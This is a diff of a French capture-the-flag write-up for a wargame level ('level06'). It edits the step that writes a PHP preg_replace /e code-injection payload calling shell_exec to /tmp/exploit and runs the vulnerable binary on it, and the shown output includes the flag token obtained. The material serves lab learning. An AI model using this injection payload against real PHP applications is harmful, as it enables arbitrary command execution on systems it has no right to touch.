@@ -26,10 +26,7 @@ Ce dernier va permettre d'executer la fonction ou le code present dans le deuxie
 Afin d'executer le binaire nous pouvons nous servir de shell_exec ou de exec. Utilisons ici shell_exec qui va executer une commande via le Shell et retourner une string.
 Il faut pour cela mettre tout d'abord nous code dans un fichier qui sera ouvert par la fonction file_get_contents()
 
-echo [x {\${shell_exec(getflag)}}] > /tmp/exploit
-
-./level06 /tmp/exploit
-
+echo [x {\${shell_exec\(getflag\)}}] > /tmp/exploit && ./level06 /tmp/exploit
 PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
  in /home/user/level06/level06.php(4) : regexp code on line 1
